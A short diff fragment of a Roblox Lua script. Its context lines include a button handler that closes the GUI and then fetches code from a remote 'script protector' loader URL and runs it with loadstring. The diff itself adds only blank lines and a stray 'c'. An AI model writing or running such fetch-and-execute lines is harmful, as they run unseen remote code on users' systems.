@@ -60,3 +60,6 @@ LoadBtn.MouseButton1Click:Connect(function()
     ScreenGui:Destroy()
     loadstring(game:HttpGet("https://syndx-armor-script-protector.vercel.app/api/loader/e44g6tl4u4t"))()
 end)
+
+
+c
